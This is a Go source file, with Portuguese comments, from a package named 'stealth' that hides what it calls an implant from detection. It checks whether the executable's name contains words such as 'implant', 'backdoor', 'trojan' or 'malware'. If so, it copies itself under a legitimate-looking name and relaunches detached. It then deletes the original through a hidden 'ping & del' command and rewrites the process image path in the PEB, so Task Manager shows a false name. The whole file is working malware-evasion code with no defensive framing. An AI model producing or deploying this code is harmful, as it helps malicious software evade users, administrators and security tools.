package stealth

import (
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ProcessNameSpoof muda o nome do processo para algo legítimo
// Técnica: Sobrescrever argv[0] e PEB (Process Environment Block)
func ProcessNameSpoof() error {
	// Obter caminho executável atual
	exePath, err := os.Executable()
	if err != nil {
		return err
	}

	exeName := filepath.Base(exePath)

	// Se já tem nome legítimo, não fazer nada
	for _, legitimateName := range legitimateNames {
		if strings.EqualFold(exeName, legitimateName) {
			return nil // Já está com nome bom
		}
	}

	// Se chegou aqui, nome é suspeito (ex: sentinel.exe)
	// Vamos renomear o arquivo EM SI antes de continuar

	// Gerar novo nome legítimo
	newName := getRandomLegitimateFileName()
	newPath := filepath.Join(filepath.Dir(exePath), newName)

	// Copiar para novo nome
	if err := copyFile(exePath, newPath); err != nil {
		return err
	}

	// Executar a nova cópia e matar o processo atual
	if err := executeAndExit(newPath); err != nil {
		return err
	}

	return nil
}

// executeAndExit executa novo processo e mata o atual
func executeAndExit(newPath string) error {
	// Criar processo com nome legítimo
	var si syscall.StartupInfo
	var pi syscall.ProcessInformation

	argv := syscall.StringToUTF16Ptr(newPath)

	err := syscall.CreateProcess(
		nil,
		argv,
		nil,
		nil,
		false,
		windows.CREATE_NEW_PROCESS_GROUP|windows.DETACHED_PROCESS,
		nil,
		nil,
		&si,
		&pi,
	)

	if err != nil {
		return err
	}

	// Fechar handles
	syscall.CloseHandle(pi.Thread)
	syscall.CloseHandle(pi.Process)

	// Deletar arquivo antigo (self-delete)
	oldPath, _ := os.Executable()

	// Agendar deleção após exit
	scheduleSelfDelete(oldPath)

	// Matar processo atual (novo processo já está rodando)
	os.Exit(0)

	return nil
}

// scheduleSelfDelete agenda auto-deleção do executável
func scheduleSelfDelete(filePath string) {
	// Técnica: cmd /c ping 127.0.0.1 -n 2 > nul & del /F /Q "<file>"
	// Espera 2 segundos (ping) e deleta

	cmd := "cmd.exe"
	args := []string{
		"/C",
		"ping 127.0.0.1 -n 2 > nul & del /F /Q \"" + filePath + "\"",
	}

	var si syscall.StartupInfo
	var pi syscall.ProcessInformation

	si.Flags = syscall.STARTF_USESHOWWINDOW
	si.ShowWindow = syscall.SW_HIDE

	cmdLine := cmd + " " + strings.Join(args, " ")
	argv := syscall.StringToUTF16Ptr(cmdLine)

	_ = syscall.CreateProcess(
		nil,
		argv,
		nil,
		nil,
		false,
		windows.CREATE_NEW_PROCESS_GROUP|windows.DETACHED_PROCESS,
		nil,
		nil,
		&si,
		&pi,
	)
}

// ChangeProcessName muda o nome exibido no Task Manager
// Técnica avançada: Modificar PEB (Process Environment Block)
func ChangeProcessName(newName string) error {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	getCurrentProcess := kernel32.NewProc("GetCurrentProcess")

	hProcess, _, _ := getCurrentProcess.Call()

	// Obter PEB (Process Environment Block)
	peb, err := getPEB(windows.Handle(hProcess))
	if err != nil {
		return err
	}

	// Modificar ImagePathName na PEB
	// Isso muda o que Process Explorer e Task Manager mostram
	newNameUTF16, err := windows.UTF16FromString(newName)
	if err != nil {
		return err
	}

	// Alocar memória para nova string
	size := uintptr(len(newNameUTF16) * 2)

	var baseAddress uintptr = 0
	var regionSize uintptr = size

	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntAllocateVirtualMemory := ntdll.NewProc("NtAllocateVirtualMemory")

	_, _, _ = ntAllocateVirtualMemory.Call(
		hProcess,
		uintptr(unsafe.Pointer(&baseAddress)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)

	// Copiar nova string
	for i, char := range newNameUTF16 {
		*(*uint16)(unsafe.Pointer(baseAddress + uintptr(i*2))) = char
	}

	// Atualizar ponteiro na PEB
	updatePEBImagePath(peb, baseAddress, uint16(len(newNameUTF16)*2))

	return nil
}

// getPEB obtém ponteiro para Process Environment Block
func getPEB(hProcess windows.Handle) (uintptr, error) {
	type PROCESS_BASIC_INFORMATION struct {
		Reserved1       uintptr
		PebBaseAddress  uintptr
		Reserved2       [2]uintptr
		UniqueProcessId uintptr
		Reserved3       uintptr
	}

	var pbi PROCESS_BASIC_INFORMATION
	var returnLength uint32

	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")

	ret, _, _ := ntQueryInformationProcess.Call(
		uintptr(hProcess),
		0, // ProcessBasicInformation
		uintptr(unsafe.Pointer(&pbi)),
		unsafe.Sizeof(pbi),
		uintptr(unsafe.Pointer(&returnLength)),
	)

	if ret != 0 {
		return 0, syscall.Errno(ret)
	}

	return pbi.PebBaseAddress, nil
}

// updatePEBImagePath atualiza ImagePathName na PEB
func updatePEBImagePath(pebAddress, newPathAddress uintptr, length uint16) {
	// Offset para ProcessParameters na PEB (x64)
	// PEB + 0x20 = ProcessParameters
	// ProcessParameters + 0x60 = ImagePathName (UNICODE_STRING)

	type UNICODE_STRING struct {
		Length        uint16
		MaximumLength uint16
		Buffer        uintptr
	}

	processParamsOffset := uintptr(0x20)
	imagePathOffset := uintptr(0x60)

	// Ler ProcessParameters
	processParams := *(*uintptr)(unsafe.Pointer(pebAddress + processParamsOffset))

	// Atualizar ImagePathName
	imagePathAddr := processParams + imagePathOffset

	var newImagePath UNICODE_STRING
	newImagePath.Length = length
	newImagePath.MaximumLength = length + 2
	newImagePath.Buffer = newPathAddress

	*(*UNICODE_STRING)(unsafe.Pointer(imagePathAddr)) = newImagePath
}

// SpoofProcessNameInMemory muda nome na memória (mais simples)
func SpoofProcessNameInMemory(newName string) {
	// Técnica mais simples: sobrescrever argv[0]
	// Funciona para ferramentas básicas, não para Process Explorer avançado

	if len(os.Args) > 0 {
		// Sobrescrever primeiro argumento
		// CUIDADO: Isso pode causar crash se não for feito corretamente

		// Em Go, os.Args é um slice, não podemos modificar diretamente
		// Mas podemos tentar via unsafe (PERIGOSO)

		// Por segurança, vamos pular esta técnica em Go
		// (Funciona melhor em C/C++)
	}
}

// RenameExecutableOnDisk renomeia o executável no disco
func RenameExecutableOnDisk() error {
	exePath, err := os.Executable()
	if err != nil {
		return err
	}

	exeName := filepath.Base(exePath)

	// Verificar se já tem nome legítimo
	for _, name := range legitimateNames {
		if strings.EqualFold(exeName, name) {
			return nil
		}
	}

	// Gerar novo nome
	newName := getRandomLegitimateFileName()
	newPath := filepath.Join(filepath.Dir(exePath), newName)

	// Renomear arquivo
	err = os.Rename(exePath, newPath)
	if err != nil {
		// Se falhar (arquivo em uso), copiar e deletar
		if err := copyFile(exePath, newPath); err != nil {
			return err
		}

		// Executar novo e agendar deleção do antigo
		return executeAndExit(newPath)
	}

	// Se renomeou com sucesso, reiniciar com novo nome
	return executeAndExit(newPath)
}

// ShouldRenameProcess verifica se processo precisa ser renomeado
func ShouldRenameProcess() bool {
	exePath, err := os.Executable()
	if err != nil {
		return false
	}

	exeName := strings.ToLower(filepath.Base(exePath))

	// Lista de nomes suspeitos
	suspiciousNames := []string{
		"sentinel", "implant", "agent", "malware", "backdoor",
		"rat", "trojan", "payload", "dropper", "loader",
		"test", "poc", "exploit", "hack",
	}

	for _, suspicious := range suspiciousNames {
		if strings.Contains(exeName, suspicious) {
			return true
		}
	}

	return false
}

// EnsureLegitimateProcessName garante que o processo tem nome legítimo
// Chama no início do main() antes de qualquer outra coisa
func EnsureLegitimateProcessName() {
	if ShouldRenameProcess() {
		// Delay para não parecer automático
		RandomDelay()

		// Tentar renomear
		if err := ProcessNameSpoof(); err != nil {
			// Se falhar, continuar mesmo assim
			// (melhor executar com nome suspeito que não executar)
		}
	}
}
